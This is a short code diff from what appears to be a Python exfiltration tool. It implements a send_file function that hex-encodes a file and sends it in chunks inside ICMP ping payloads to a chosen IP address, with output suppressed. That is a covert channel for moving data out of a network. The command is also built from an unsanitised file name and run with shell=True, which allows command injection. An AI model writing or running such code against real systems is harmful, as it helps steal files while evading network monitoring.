@@ -29,7 +29,13 @@ def get_colours(text, color):
 
 
 def send_file(ip_address, file_name):
-    pass
+    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; done >/dev/null 2>&1"""
+    get_colours("\n[+] Trying to send file...", 'blue')
+    check_output = subprocess.run([file_load], shell=True, capture_output=True, text=True)
+    if 'No such file or directory' in str(check_output):
+        get_colours('\n[!] Indicate file not found, check file name.', 'red')
+    else:
+        get_colours("\n[+] File sent successfully.", 'green')
 
 
 if len(sys.argv) != 3:
